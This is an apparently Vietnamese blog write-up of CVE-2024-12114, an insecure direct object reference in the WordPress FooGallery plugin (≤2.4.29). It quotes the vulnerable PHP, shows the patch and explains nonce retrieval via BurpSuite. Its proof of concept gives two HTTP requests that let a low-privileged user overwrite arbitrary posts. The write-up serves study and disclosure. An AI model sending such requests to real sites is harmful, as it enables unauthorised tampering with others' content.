# CVE-2024-12114 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **FooGallery – Responsive Photo Gallery, Image Viewer, Justified, Masonry & Carousel** dành cho **WordPress** tồn tại lỗ hổng **Insecure Direct Object Reference** trong **tất cả các phiên bản đến và bao gồm 2.4.29** thông qua hành động AJAX **`foogallery_attachment_modal_save`**, do **thiếu xác thực** đối với một khóa do người dùng kiểm soát (**`img_id`**).  
Điều này cho phép **kẻ tấn công đã xác thực**, với **quyền truy cập được cấp trở lên**, có thể **cập nhật nội dung của bất kỳ bài viết hoặc trang nào**.  
Tác động thực sự chỉ xảy ra khi **thiết lập vai trò Gallery Creator** được đặt ở mức **thấp hơn “Editor”**.

* **CVE ID**: [CVE-2024-12114](https://www.cve.org/CVERecord?id=CVE-2024-12114)
* **Vulnerability Type**: Insecure Direct Object References (IDOR)
* **Affected Versions**: <= 2.4.29
* **Patched Versions**: 2.4.30
* **CVSS severity**: Low (4.3)
* **Required Privilege**: N/A
* **Product**: [WordPress FooGallery Plugin](https://wordpress.org/plugins/foogallery/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **FooGallery**:  
    * `2.4.29` – **vulnerable**  
    * `2.4.30` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

> [!INFO] 
> Theo mô tả cúa CVE, tác động thực sự chỉ xảy ra khi **thiết lập vai trò Gallery Creator** được đặt ở mức **thấp hơn “Editor”**.
> Bạn có thể thiết lập nó ở đây:
> ![Role](role.png "Gallery Creator role")
> Khi đó, user có vai trò này sẽ có thể dùng chức năng **Add**/**Edit** Gallery:
> ![Create/Add](create.png "Create/Add")

## Analysis 
Plugin đăng ký AJAX handler **cho người dùng đã đăng nhập**:

```php {title="class-gallery-attachment-modal.php v2.4.29" data-open=true hl_lines=[]}
add_action( 'wp_ajax_foogallery_attachment_modal_save', array( $this, 'ajax_save_modal' ) );
```

`wp_ajax_` là hook dành cho người dùng đã đăng nhập (Subcriber+). Khi có request tới endpoint `/wp-admin/admin-ajax.php` với param `action=foogallery_attachment_modal_save` thì callback `ajax_save_modal` được gọi:

```php {title="class-gallery-attachment-modal.php v2.4.29" data-open=true hl_lines=[9,16]}
public function ajax_save_modal() {
    $foogallery = ( isset( $_POST['foogallery'] ) ? $_POST['foogallery'] : array() );

    if ( !is_array( $foogallery ) || empty( $foogallery ) ) {
        return;
    }

    // Check for nonce security      
    if ( ! wp_verify_nonce( $_POST['nonce'], 'foogallery-modal-nonce' ) ) {
        die ( 'Busted!');
    }

    $img_id = intval( sanitize_text_field( $_POST['img_id'] ) );

    if ( $img_id > 0 ) {
        do_action( 'foogallery_attachment_save_data', $img_id, $foogallery );
    }
    
    wp_die();
}
```

Hàm lấy `foogallery` từ request, kiểm tra nếu là một mảng có giá trị thì tiếp tục kiểm tra `nonce` đảm bảo request hợp lệ:

```php
if ( ! wp_verify_nonce( $_POST['nonce'], 'foogallery-modal-nonce' ) ) {
    die ( 'Busted!');
}
```

Hàm `wp_verify_nonce()` sẽ kiểm tra giá trị `nonce` gửi lên có hợp lệ (`nonce` được tạo bởi action `foogallery-modal-nonce`) hay không.

Nếu hợp lệ và `img_id > 0`, `do_action('foogallery_attachment_save_data',...)` đuợc gọi với giá trị của `img_id` và `foogallery` từ request.

Trước đó, plugin đã đăng ký một loạt các callback cho action `foogallery_attachment_save_data`:

![Add action](add_action.png "Các callback được đăng ký cho action foogallery_attachment_save_data")

```php {title="class-gallery-attachment-modal.php v2.4.29" data-open=true hl_lines=[]}
public function foogallery_attachment_save_data_main( $img_id, $data ) {

    if ( is_array( $data ) && !empty( $data ) ) {

        $foogallery_post = array(
            'ID' => $img_id
        );

        if ( array_key_exists( 'title', $data ) ) {
            $foogallery_post['post_title'] = $data['title'];
        }

        if ( array_key_exists( 'caption', $data ) ) {
            $foogallery_post['post_excerpt'] = $data['caption'];
        }

        if ( array_key_exists( 'description', $data ) ) {
            $foogallery_post['post_content'] = $data['description'];
        }

        // Update post meta values
        if ( array_key_exists( 'alt-text', $data ) ) {
            update_post_meta( $img_id, '_wp_attachment_image_alt', $data['alt-text'] );
        }

        if ( array_key_exists( 'custom-url', $data ) ) {
            update_post_meta( $img_id, '_foogallery_custom_url', $data['custom-url'] );
        }

        if ( array_key_exists( 'custom-target', $data ) ) {
            update_post_meta( $img_id, '_foogallery_custom_target', $data['custom-target'] );
        }

        if ( array_key_exists( 'custom-class', $data ) ) {
            update_post_meta( $img_id, '_foogallery_custom_class', $data['custom-class'] );
        }

        if ( is_array( $foogallery_post ) && count( $foogallery_post ) > 1 ) {
            // Update the post into the database
            wp_update_post( $foogallery_post );
        }
    }
}
```

```php {title="class-gallery-attachment-modal.php v2.4.29" data-open=true hl_lines=[]}
public function foogallery_attachment_save_data_taxonomies( $img_id, $data ) {
    if ( is_array( $data ) && !empty( $data ) ) {

        if ( !$this->attachments_have_taxonomies() ) {
            return;
        }

        if ( array_key_exists( 'taxonomies', $data ) ) {
            foreach ( $data['taxonomies'] as $taxonomy => $taxonomy_value ) {
                $terms = explode( ',', $taxonomy_value );
                if ( is_array( $terms ) ) {
                    $terms = array_map( 'intval', $terms );
                    wp_set_object_terms( $img_id, $terms, $taxonomy, false );
                }
            }
        }
    }
}
```

```php {title="class-gallery-attachment-modal.php v2.4.29" data-open=true hl_lines=[]}
public function foogallery_attachment_save_data_thumbnails( $img_id, $data ) {
    if ( is_array( $data ) && !empty( $data ) ) {

        if ( array_key_exists( 'crop_pos', $data ) ) {
            update_post_meta( $img_id, 'foogallery_crop_pos', $data['crop_pos'] );
        }

        if ( array_key_exists( 'override-thumbnail-id', $data ) ) {
            update_post_meta( $img_id, 'foogallery_override_thumbnail', $data['override-thumbnail-id'] );
        }
    }
}
```

```php {title="class-gallery-attachment-modal.php v2.4.29" data-open=true hl_lines=[]}
public function foogallery_attachment_save_data_advanced($img_id, $data ) {
    if ( is_array( $data ) && !empty( $data ) ) {
        if ( array_key_exists( 'data-width', $data ) ) {
            update_post_meta( $img_id, '_data-width', $data['data-width'] );
        }

        if ( array_key_exists( 'data-height', $data ) ) {
            update_post_meta( $img_id, '_data-height', $data['data-height'] );
        }

        if ( array_key_exists( 'panning', $data ) ) {
            update_post_meta( $img_id, '_foobox_panning', $data['panning'] );
        }

        if ( array_key_exists( 'override_type', $data ) ) {
            update_post_meta( $img_id, '_foogallery_override_type', $data['override_type'] );
        }
    }
}
```

Các callback thực hiện một loạt các update với gallery tương ứng với `img_id` và dữ liệu là `foogallery`, tất cả đều có thể được kiểm soát bởi attacker.

Lỗ hổng IDOR xảy ra vì không có ràng buộc nào đối với gallery tương ứng `img_id` khiến kẻ tấn công có thể gửi request tùy ý để chỉnh sửa nội dung gallery không thuộc quyền của mình.

Bản vá `v2.4.30` đã thêm ràng buộc:

```php
if ( current_user_can('edit_post', $img_id ) ) {
    do_action( 'foogallery_attachment_save_data', $img_id, $foogallery );
}
```

![Patch](patch.png "Bản vá")

Chỉ người dùng có quyền `edit_post` với id `$img_id` thì mới được phép gọi đến action `foogallery_attachment_save_data` để chỉnh sưa nó.

---

Điều tiên quyết là cần tìm cách để lấy được giá trị của nonce tương ứng với action `foogallery-modal-nonce`

![Create nonce](create_nonce.png "Xây dựng nonce với action foogallery-modal-nonce")

Nonce được khởi tạo trong hàm `build_modal_data()` bằng cách gọi `wp_create_nonce( 'foogallery-modal-nonce' )` và nếu đáp ứng 2 điều kiện: 
* `$data` là một mảng
* `img_id` và `gallery_id` khác `null`

Hàm `build_modal_data` sẽ trả về mảng có chứa giá trị bao gồm `nonce`.

![Embed nonce](embed_nonce.png "Giá trị của nonce được thêm vào HTML")

Giá trị này được hàm `ajax_open_modal` sử dụng, `nonce` sẽ được thêm vào HTML với form id là `foogallery_attachment_modal_save_form`

Nhưng trước đó, `ajax_open_modal` sẽ thực hiện kiểm tra nonce tương ứng với action `foogallery_attachment_modal_open`

```php
if ( ! wp_verify_nonce( $_POST['nonce'], 'foogallery_attachment_modal_open' ) ) {
    die ( 'Busted!');
}
```

![Create nonce](create_nonce1.png "Xây dựng nonce với action foogallery_attachment_modal_open")

Đọc logic của hàm, ta thấy nonce sẽ được thêm vào HTML của **edit gallery**

Sử dụng chức năng **edit gallery** => cho request qua BurpSuite => Filter request với từ khóa `foogallery-image-edit-modal`

![Data nonce](data_nonce.png "Giá trị của nonce trong khi filter")

Ta lấy được giá trị của nonce này

## Flow
{{< mermaid >}}
flowchart TD
A["Authenticated User (Subscriber+)"] 
--> B["Request admin-ajax.php?action=foogallery_attachment_modal_open"]

B --> C["Verify nonce: foogallery_attachment_modal_open"]

C --> D["Return HTML modal + embedded nonce (foogallery-modal-nonce)"]

D --> E["User extracts nonce from response"]

E --> F["Send request: action=foogallery_attachment_modal_save"]

F --> G["Verify nonce: foogallery-modal-nonce"]

G --> H["Extract img_id from request"]

H --> I["No capability / ownership check (edit_post)"]

I --> J["do_action(foogallery_attachment_save_data, img_id, data)"]

J --> K["Update post / attachment data"]

K --> L["Unauthorized modification of arbitrary gallery/post (IDOR)"]

{{< /mermaid >}}

## Proof of Concept (PoC)
1. Thực hiện edit galery với user có quyền `Gallery Creator`
2. Search từ khóa `foogallery-image-edit-modal` và lấy nonce từ response
3. Gửi request để lấy nonce tương ứng với form `foogallery_attachment_modal_save_form`

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Cookie: valid_cookie

action=foogallery_attachment_modal_open&nonce=9ad3ed3e9b&img_id=1&gallery_id=1
```

![Get nonce](get_nonce.png "Lấy nonce từ response")

4. Gửi request để thay đổi data của gallery bất kỳ

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Cookie: valid_cookie

action=foogallery_attachment_modal_save&nonce=11bfc5f814&foogallery[]=any_data&img_id=1
```

---

Sử dụng UI để thực hiện:
1. Truy cập `http://localhost/wp-admin/post.php?post=post_id&action=edit#`

2. Thực hiện edit và save

![Edit](edit.png "Edit and save")

## Conclusion

Lỗ hổng xảy ra do **thiếu kiểm tra quyền truy cập (authorization)** đối với `img_id`.  
Mặc dù có kiểm tra nonce, plugin vẫn cho phép người dùng đã đăng nhập thao tác lên **gallery không thuộc quyền sở hữu**, dẫn đến **IDOR**.  
Bản vá 2.4.30 khắc phục bằng cách kiểm tra `current_user_can( 'edit_post', $img_id )`.

## Key Takeaways

- Nonce **không thay thế** cho kiểm soát quyền  
- Phải kiểm tra quyền theo **đối tượng cụ thể (object-level)**  
- Không tin dữ liệu client, kể cả khi có nonce  
- IDOR thường xuất hiện trong AJAX handler thiếu `current_user_can()`  

## References
[IDOR](https://book.hacktricks.wiki/en/pentesting-web/idor.html)

[WordPress FooGallery Plugin <= 2.4.29 is vulnerable to Insecure Direct Object References (IDOR)](https://patchstack.com/database/wordpress/plugin/foogallery/vulnerability/wordpress-foogallery-plugin-2-4-29-insecure-direct-object-reference-to-authenticated-custom-arbitrary-post-page-updates-vulnerability) 

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-30-cve-2024-12114/  

